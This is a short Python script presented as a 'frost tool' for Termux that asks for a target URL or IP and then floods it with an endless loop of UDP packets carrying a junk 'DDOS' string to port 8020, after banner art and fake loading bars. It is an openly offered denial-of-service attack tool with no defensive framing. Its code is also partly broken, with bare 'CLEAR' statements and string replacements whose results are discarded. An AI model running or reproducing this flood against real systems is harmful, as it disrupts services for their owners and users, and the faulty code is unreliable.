import time
import socket
import os
red='\033[31m'
green='\033[32m'
os.system("pkg install toilet -y ")
os.system("pkg install figlet -y ")
os.system("clear")
os.system("toilet -f mono12 -F metal frost tool")
print(" ↦ Any problem? dm me zrafei#2021 on discord ")
print("Remember you are best ")
print(" Enjoy your tool ")
print(" ➥==========================================➣")
target = input(f"{green}Enter Target URL or IP NO ONE MESSES WİTH THİS GUY : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = 8020
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
os.system("clear")
os.system("toilet Loading")
print("Loading[IIIII]5%")
time.sleep(3)
CLEAR
print("Loading[IIIIIIIII]26%")
time.sleep(4)
CLEAR
print("Loading{IIIIIIIIIIIIIII}68%")
time.sleep(5)
CLEAR
print("Loading[IIIIIIIIIIIIIIIIIIII]87%")
time.sleep(6)
CLEAR
print("•→START←•")
time.sleep(2)
print("Loading{~ }100%")
os.system("clear")
os.system("figlet Attack_Starting")
while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
     print(port,"sending pack to : ",ip)
